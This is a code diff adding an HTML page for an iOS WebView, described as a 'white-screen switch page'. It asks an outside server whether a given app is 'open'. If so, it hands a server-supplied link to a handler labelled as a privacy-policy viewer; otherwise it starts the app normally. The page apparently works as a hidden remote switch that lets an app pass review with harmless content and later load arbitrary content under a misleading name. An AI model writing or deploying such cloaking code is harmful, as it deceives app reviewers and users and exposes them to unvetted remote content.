@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <title>白屏接口请求页</title>
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <script>
+        // MT-type white-screen switch page (GitHub Pages)
+        // Usage: welcome.html?key=com.YourBundle
+        // Optional: &api=https://diowen.sbs/api/v1/tro/querySwitch
+        let cacheLink = null;
+        let isOpen = false;
+
+        const params = new URLSearchParams(window.location.search);
+        const SWITCH_KEY = params.get('key') || '';
+        const SWITCH_API = params.get('api') || 'https://diowen.sbs/api/v1/tro/querySwitch';
+
+        function postStart() {
+            try {
+                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.startAPP) {
+                    window.webkit.messageHandlers.startAPP.postMessage(null);
+                }
+            } catch (e) { }
+        }
+
+        function postPrivacy(link) {
+            try {
+                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.scanPrivacyPolicy) {
+                    window.webkit.messageHandlers.scanPrivacyPolicy.postMessage(link);
+                }
+            } catch (e) { }
+        }
+
+        function fetchSwitchInfo() {
+            if (!SWITCH_KEY) {
+                console.log('missing key query param');
+                postStart();
+                return;
+            }
+            fetch(SWITCH_API + '?key=' + encodeURIComponent(SWITCH_KEY))
+                .then(res => res.json())
+                .then(resp => {
+                    console.log('接口返回：', resp);
+                    if (resp.success && resp.code === 200 && resp.data && resp.data.status === 'open') {
+                        isOpen = true;
+                        cacheLink = resp.data.link;
+                        postPrivacy(cacheLink);
+                    } else {
+                        isOpen = false;
+                        cacheLink = null;
+                        postStart();
+                    }
+                })
+                .catch(err => {
+                    console.log('接口请求失败', err);
+                    isOpen = false;
+                    cacheLink = null;
+                    postStart();
+                });
+        }
+
+        fetchSwitchInfo();
+
+        document.addEventListener('visibilitychange', function () {
+            if (!document.hidden) {
+                if (isOpen && cacheLink) {
+                    postPrivacy(cacheLink);
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
